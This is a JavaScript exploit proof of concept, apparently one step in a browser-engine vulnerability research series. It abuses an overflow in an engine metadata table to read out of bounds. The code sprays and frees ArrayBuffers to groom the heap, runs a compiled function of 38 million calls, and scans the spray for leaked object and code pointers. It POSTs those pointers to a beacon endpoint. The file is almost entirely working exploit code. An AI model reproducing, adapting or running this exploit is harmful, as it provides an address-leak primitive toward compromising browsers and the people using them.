// p196 — MetadataTable overflow: controlled OOB with zero-spray
//
// PROVEN: overflow is during EXECUTION, not compilation (p149g).
// PROVEN: 38,348,816 op_call entries, stride=112, wraps to 100,096 bytes.
// Entries 0-893 are in-bounds. Entries 894+ are OOB.
//
// Strategy:
// 1. Spray 120 zero-filled ArrayBuffers (100,096 bytes each)
// 2. Free every 3rd → holes for metadata buffer
// 3. GC → metadata lands in a freed hole
// 4. Compile the 38M-call function
// 5. Call it with counting callback that throws after 893 + WINDOW
//    - In-bounds calls (0-893): read valid metadata, safe
//    - OOB calls (894-893+WINDOW): read zeros → slow path → safe
//    - Call 893+WINDOW+1: callback throws → stops execution
// 6. Scan surviving zero buffers for ANY non-zero byte = leaked metadata
//
// Metadata entries contain pointers to JSObjects, CodeBlocks, etc.
// Non-zero bytes in our spray = ADDRESS LEAK.
//
// Beacon prefix: V196-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V196-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V196-' + tag + '?t=' + Date.now(), false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch (e) {}
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var BUF_SZ = 100096;
  var SPRAY_N = 120;
  var WINDOW = 2000;

  // Phase 1: Zero-filled spray
  var sprays = [];
  var views = [];
  for (var i = 0; i < SPRAY_N; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    sprays.push(ab);
    views.push(new Uint8Array(ab));
  }
  B('SPRAY-' + SPRAY_N);

  // Phase 2: Free every 3rd to create holes
  var freed = 0;
  for (var i = 0; i < SPRAY_N; i += 3) {
    sprays[i] = null;
    views[i] = null;
    freed++;
  }
  B('HOLES-' + freed);

  // Phase 3: GC pressure
  var gcR = 0;
  function gcP() {
    try {
      for (var g = 0; g < 300; g++) { var t = new ArrayBuffer(8192); t = null; }
    } catch (e) {}
    gcR++;
    if (gcR < 25) setTimeout(gcP, 30);
    else { B('GC-DONE'); phaseBuild(); }
  }
  gcP();

  function phaseBuild() {
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p196fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p196ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      var ok = window.__p196ok ? 'OK' : 'FAIL';
      B('COMPILED-' + ok);
      if (ok === 'OK') setTimeout(phaseCall, 200);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // Phase 4: Call with counting callback
  function phaseCall() {
    B('CALL-START');

    var callCount = 0;
    var TARGET = 893 + WINDOW;

    function callback() {
      callCount++;
      if (callCount > TARGET) {
        throw 'STOP';
      }
    }

    try {
      window.__p196fn(callback);
      B('CALL-RETURNED-' + callCount);
    } catch (e) {
      B('CALL-THREW-' + callCount);
    }

    setTimeout(phaseRead, 100);
  }

  // Phase 5: Scan for leaked bytes
  function phaseRead() {
    B('READ-START');

    var hitCount = 0;
    var totalNonZero = 0;
    var leakData = [];

    for (var i = 0; i < SPRAY_N; i++) {
      if (!views[i]) continue;
      var v = views[i];
      var nonZero = 0;
      var firstOff = -1;

      for (var j = 0; j < v.length; j++) {
        if (v[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nonZero++;
        }
      }

      if (nonZero > 0) {
        hitCount++;
        totalNonZero += nonZero;
        B('HIT-' + i + '-nz=' + nonZero + '-f=' + firstOff);

        // Dump first 4 non-zero 112-byte aligned regions
        var dumped = 0;
        for (var e = 0; e + 112 <= v.length && dumped < 4; e += 112) {
          var hasNZ = false;
          for (var c = e; c < e + 112; c++) {
            if (v[c] !== 0) { hasNZ = true; break; }
          }
          if (!hasNZ) continue;
          dumped++;

          // Extract 8-byte values (potential pointers)
          var ptrs = '';
          for (var p = 0; p < 112; p += 8) {
            var nz = false;
            for (var b = 0; b < 8; b++) {
              if (v[e + p + b] !== 0) { nz = true; break; }
            }
            if (nz) {
              var hex8 = '';
              for (var h = 7; h >= 0; h--) hex8 += hexByte(v[e + p + h]);
              ptrs += '+' + p + ':' + hex8 + ' ';
            }
          }
          if (ptrs) BP('L' + i + '@' + e, ptrs.trim());
        }
      }
    }

    B('DONE-hits=' + hitCount + '-nz=' + totalNonZero);
  }
})();
